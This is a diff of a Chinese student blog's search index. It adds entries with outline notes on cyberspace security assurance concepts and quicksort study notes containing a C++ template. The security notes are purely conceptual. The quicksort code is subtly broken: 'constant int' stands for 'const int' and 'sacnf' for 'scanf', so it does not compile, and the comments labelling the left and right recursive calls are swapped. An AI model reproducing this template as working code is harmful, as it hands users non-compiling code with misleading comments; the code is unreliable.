+          <category> 数据挖掘 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网安保障</title>
+      <link href="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/"/>
+      <url>/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/</url>
+      
+        <content type="html"><![CDATA[<h1 id="网安保障"><a href="#网安保障" class="headerlink" title="网安保障"></a>网安保障</h1><h2 id="知识域一："><a href="#知识域一：" class="headerlink" title="知识域一："></a>知识域一：</h2><h3 id="一、信息"><a href="#一、信息" class="headerlink" title="一、信息"></a>一、信息</h3><h5 id="1-信息概念"><a href="#1-信息概念" class="headerlink" title="1. 信息概念"></a>1. 信息概念</h5><p>- </p><h5 id="2-信息的性质"><a href="#2-信息的性质" class="headerlink" title="2. 信息的性质"></a>2. 信息的性质</h5><ul><li>依附性</li><li>动态性</li><li>可处理性</li><li>共享性</li><li>可传递性</li><li>异步性</li><li>可交换性</li><li>可伪性</li></ul><h3 id="二、网络空间安全的基本属性"><a href="#二、网络空间安全的基本属性" class="headerlink" title="二、网络空间安全的基本属性"></a>二、网络空间安全的基本属性</h3><p>保密性、完整性、可用性</p><h5 id="1-网络空间安全的特征与范畴"><a href="#1-网络空间安全的特征与范畴" class="headerlink" title="1. 网络空间安全的特征与范畴"></a>1. 网络空间安全的特征与范畴</h5><ul><li>特征<ul><li>是系统的安全</li><li>动态的安全</li><li>无边界的安全</li><li>非传统的安全</li></ul></li><li>范畴</li></ul><h5 id="2-网络空间安全发展阶段"><a href="#2-网络空间安全发展阶段" class="headerlink" title="2. 网络空间安全发展阶段"></a>2. 网络空间安全发展阶段</h5><p>…</p><ul><li><h2 id="CS（三位一体）-网络防御-网络攻击"><a href="#CS（三位一体）-网络防御-网络攻击" class="headerlink" title="CS（三位一体）- 网络防御- 网络攻击"></a>CS（三位一体）<br>- 网络防御<br>- 网络攻击</h2></li></ul><h2 id="2-知识域二：网络空间安全保障"><a href="#2-知识域二：网络空间安全保障" class="headerlink" title="2.知识域二：网络空间安全保障"></a>2.知识域二：网络空间安全保障</h2><h3 id="一、网络安全保障定义"><a href="#一、网络安全保障定义" class="headerlink" title="一、网络安全保障定义"></a>一、网络安全保障定义</h3><ul><li><p>防止信息泄露、修改、破坏</p></li><li><p>网络空间安全保障是一种立体的保障</p></li><li><p>网络空间安全保障VS信息安全（ppt）</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全知识，网安技术 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安保障 </tag>
+            
+            <tag> 网安技术 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>重点知识掌握</title>
+      <link href="/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/"/>
+      <url>/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/image-20231009085053451.png" alt="image-20231009085053451"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全知识，网安技术 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安技术 </tag>
+            
+            <tag> 章节重点 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>快排</title>
+      <link href="/2023/10/08/%E5%BF%AB%E6%8E%92/"/>
+      <url>/2023/10/08/%E5%BF%AB%E6%8E%92/</url>
+      
+        <content type="html"><![CDATA[<h1 id="快排思想"><a href="#快排思想" class="headerlink" title="快排思想"></a>快排思想</h1><ul><li>分治</li><li>确定分界点：<code>q[l],q[r],q[(r+l)/2] 或随机</code></li><li>调整区间***：右边全部&lt;&#x3D;x;左边全部&gt;&#x3D;x</li><li>递归处理左边和右边</li></ul><h1 id="调整区间"><a href="#调整区间" class="headerlink" title="调整区间"></a>调整区间</h1><ul><li>暴力求解：额外开辟两个数组用来存放q中大于等于x的和小于等于x的</li><li>双指针：保证i指针左边（不包括i）所有数小于等于x；j指针右边（不包括j）所有数大于等于x</li></ul><h1 id="快排模板"><a href="#快排模板" class="headerlink" title="快排模板"></a>快排模板</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">constant <span class="type">int</span> N =<span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> x = q[l], i=l<span class="number">-1</span>, j=r+<span class="number">1</span>; <span class="comment">//设定超出边界值的指针,后续先移动再比较</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i++; <span class="keyword">while</span>(q[i]&lt;x);</span><br><span class="line">        <span class="keyword">do</span> j--; <span class="keyword">while</span>(q[j]&gt;x);</span><br><span class="line">        <span class="keyword">if</span> (i&lt;j) <span class="built_in">swap</span>(q[i],q[j]);</span><br><span class="line">        <span class="comment">/*&#123;</span></span><br><span class="line"><span class="comment">            int t=q[i];</span></span><br><span class="line"><span class="comment">            q[i] = q[j];</span></span><br><span class="line"><span class="comment">            q[j] = t;</span></span><br><span class="line"><span class="comment">        &#125;*/</span> <span class="comment">//没有swap函数的时候</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">quick_sort</span>(q,l,j);<span class="comment">//右边</span></span><br><span class="line">    <span class="built_in">quick_sort</span>(q,j+<span class="number">1</span>,r);<span class="comment">//左边</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) <span class="built_in">sacnf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;n;i ++) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>理解：此算法并没有按照教材中显示的不停用边界值交换，这减少了交换的次数，也表示出，最终一轮迭代结束后，分界线处不一定是边界值</p><p>可行原因：两句dowhile表明：i（不包含i）的左侧一定&lt;x；j（不包含j）的右侧一定&gt;x；后面的swap能够保证此时的i&lt;&#x3D;x，j&gt;&#x3D;x，这也让循环中下一次先do有了条件，do了以后又满足本段第一行条件（两句…）。</p><p>递归边界的理解：当大while结束以后，i&gt;&#x3D;j（323i&gt;j）</p><p>​用j：递归右边（大于等于x）j的右侧不能包含i，取j+1</p><p>​同理，用i：递归左边不能包含j，取i-1</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 算法学习，蓝桥杯 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 蓝桥杯，排序 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Css基础</title>
       <link href="/2023/09/29/Css%E5%9F%BA%E7%A1%80/"/>
       <url>/2023/09/29/Css%E5%9F%BA%E7%A1%80/</url>
@@ -95,9 +251,9 @@
       
         <tags>
             
-            <tag> 习题 </tag>
-            
             <tag> 网安技术 </tag>
+            
+            <tag> 习题 </tag>
             
         </tags>
       
